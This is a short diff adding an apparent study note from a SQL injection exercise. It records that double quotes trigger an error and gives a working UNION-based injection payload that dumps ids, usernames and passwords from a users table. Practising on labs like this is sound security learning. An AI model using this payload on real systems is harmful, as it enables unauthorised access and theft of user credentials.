@@ -1,0 +1,4 @@
+double quotes give an error
+
+
+?id=-1") union select 1,2,group_concat(id,username,password) from users#
